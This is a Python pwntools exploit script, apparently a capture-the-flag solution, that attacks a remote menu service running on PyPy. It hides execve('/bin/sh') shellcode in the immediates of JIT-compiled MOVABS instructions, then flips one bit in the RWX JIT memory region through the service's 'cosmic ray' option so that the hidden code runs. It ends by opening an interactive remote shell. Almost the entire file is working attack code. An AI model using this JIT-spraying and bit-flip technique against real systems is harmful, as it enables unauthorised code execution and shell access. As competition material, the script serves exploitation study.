#!/usr/bin/env python3
#
# @mebeim - 2025-08-28
#

import sys
from os import getenv

from pwn import asm, context, log, remote, u64


HOST = getenv('HOST', 'localhost')
PORT = int(getenv('PORT', '1337'))

# Offset of byte to flip into PyPy JIT RWX VMA. Note, things may change
# depending on host kernel. This was tested on Ubuntu 24.04.03 host with kernel
# 6.8.0-78-generic (standard Ubuntu Desktop) and 6.14.0-1012-aws (AWS EC2).
COSMIC_RAY_RWX_OFF = 0x2a25


def get_cosmic_ray_offset(r: remote):
	# Calculate right offset to flip correct bit in RWX JIT region
	r.sendlineafter(b'> ', b'T')
	r.sendlineafter(b'Where? ', b'99999999999999999')

	off = 0
	while 1:
		r.recvuntil(b'Cosmic ray spares ')
		sz = int(r.recvuntil(b' bytes', drop=True), 0)
		if sz == 0x100000:
			break

		off += sz

	r.recvuntil(b'Invalid position')
	return (off + COSMIC_RAY_RWX_OFF) * 8 + 3


def create_func(r: remote, name: str, ops: list[str]):
	r.sendlineafter(b'> ', b'B')
	r.sendlineafter(b'Name: ', name.encode())

	for op in ops:
		r.sendlineafter(b'> ', op.encode())
	r.sendlineafter(b'> ', b'END')


def call_func(r: remote, name: str, arg: int=0) -> bytes:
	r.sendlineafter(b'> ', b'C')
	r.sendlineafter(b'Name: ', name.encode())
	r.sendlineafter(b'Argument: ', str(arg).encode())


def cosmic_ray(r: remote, where: int):
	r.sendlineafter(b'> ', b'T')
	r.sendlineafter(b'Where? ', str(where).encode())


def pack_movabs(insns: str, jmp_off: int) -> int:
	assert 2 <= jmp_off <= 0x81
	imm = asm(insns)
	assert len(imm) <= 6, insns
	return u64(imm.ljust(6, b'\x90') + b'\xeb' + (jmp_off - 2).to_bytes(1, 'big'))


def pack_movabs_raw(insns: str, fill: bytes) -> int:
	imm = asm(insns)
	assert len(imm) <= 6, insns
	return u64(imm.ljust(8, fill))


def build_function_insns() -> list[str]:
	shellcode_immediates = [
		# First MOVABS only serves as placeholder to be altered into a different
		# instruction (via cosmic ray) to execute its first immediate and start
		# the actual shellcode:
		#
		#     0: 49 bb 90 eb 1f 01 01 01 01 01    movabs r11,  0x1010101011feb90
		#
		# Flipping bit 3 in the second byte (bb -> b3) the result will be:
		#
		#     0: 49 b3 90       rex.WB mov r11b,  0x90
		#     3: eb 1f          jmp    0x24
		#     5: <...junk...>
		#
		pack_movabs_raw('nop; jmp short $+0x1e', fill=b'\x01'),

		pack_movabs('push 0x68732f'             , jmp_off=0x19),
		pack_movabs('shl qword ptr [rsp], 16'   , jmp_off=0x19),
		pack_movabs('add word ptr [rsp], 0x6e69', jmp_off=0x19),
		pack_movabs('shl qword ptr [rsp], 16'   , jmp_off=0x19),

		# After a few immediates JITed code changes and there is a gap: need to
		# jump over it to continue.
		pack_movabs_raw('jmp $+0xf2', fill=b'\x61'),

		pack_movabs('add word ptr [rsp], 0x622f'              , jmp_off=0x63),
		pack_movabs('mov rdi, rsp; push 0'                    , jmp_off=0x63),
		pack_movabs('push rdi; mov rsi, rsp'                  , jmp_off=0x63),
		pack_movabs('xor edx, edx; xor eax, eax; mov al, 0x3b', jmp_off=0x63),
		pack_movabs('syscall'                                 , jmp_off=0x63),
	]

	insns = []
	for imm in shellcode_immediates:
		insns.append(f'ADD {imm:#x}')

	insns += ['REPEAT 10000', 'LIST']
	log.info('Function ops: %r', insns)

	return insns


def run(function_insns: list[str]):
	r = remote(HOST, PORT)

	# Create lambda with a bunch of MOVABS containing shellcode in immediates
	create_func(r, 'f', function_insns)

	# Let PyPy JIT the lambda
	call_func(r, 'f')

	# Turn first MOVABS into shorter insns to run shellcode in first immediate
	off = get_cosmic_ray_offset(r)
	cosmic_ray(r, off)

	# GG
	call_func(r, 'f')

	if r.recvline(timeout=3) != b'':
		# Function returned something: exploit unsuccessful
		log.failure('Exploit unsuccessful')
		r.close()
		return False

	# Function returned nothing: must be the shell waiting for input
	log.success('We should have a shell now')
	r.interactive()
	return True


def main():
	context(arch='amd64')
	function_insns = build_function_insns()

	# May need a few runs as the cosmic ray offset is not 100% stable. It can
	# also vary depending on the platform and kernel version so the offset at
	# the top of the script may need to be changed.
	for i in range(10):
		log.info('Attempt %d', i + 1)

		try:
			if run(function_insns):
				return 0
		except EOFError:
			log.failure('EOF')

	log.failure('Exceeded max exploit attempts!')
	return 1


if __name__ == '__main__':
	sys.exit(main())
